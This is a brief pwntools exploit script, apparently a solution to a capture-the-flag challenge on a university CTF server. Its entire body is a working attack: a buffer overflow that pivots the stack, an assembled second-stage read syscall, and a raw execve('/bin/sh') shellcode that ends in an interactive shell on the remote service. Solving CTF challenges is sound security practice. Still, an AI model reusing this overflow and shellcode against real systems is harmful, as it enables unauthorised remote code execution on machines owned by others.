from pwn import *

r = remote("ctf.adl.csie.ncu.edu.tw", 11011)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

r.recvuntil("?\n")
r.recvuntil(":\n")

name = 0x6010c0
before_read = 0x4008f9
read = 0x40090f
buf1 = 0x602000 - 0x300

r.sendline("abcde")
r.recvuntil("me!")

payload = "a" * 16 + flat([buf1 + 0x10, before_read])
r.send(payload)

payload2 = asm(
'''
push rax
pop rdi
mov rsi, 0x601d10
push r11
pop rdx
nop
nop
syscall
'''
) + flat([0x0, buf1])
 
r.send(payload2)

r.send("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

r.interactive()
